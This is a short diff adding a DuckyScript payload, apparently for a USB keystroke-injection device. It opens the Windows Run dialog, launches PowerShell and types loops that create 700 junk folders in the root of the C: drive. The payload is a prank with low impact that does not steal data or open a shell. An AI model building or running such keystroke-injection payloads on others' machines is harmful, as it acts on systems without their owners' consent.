@@ -1,0 +1,17 @@
+REM Author: SeenKid (seenkid#1337 on Discord)
+REM Description: Creates a lot of folders in C:
+REM Version:	1.0
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell
+ENTER
+DELAY 900
+STRING (1..300) | % {new-item -type directory -path "C:\_331232ADA-$_"}
+ENTER
+DELAY 5000
+STRING (1..200) | % {new-item -type directory -path "C:\fdsA$_AAA$_"}
+ENTER
+DELAY 4000
+STRING (1..200) | % {new-item -type directory -path "C:\_$_"}
+ENTER
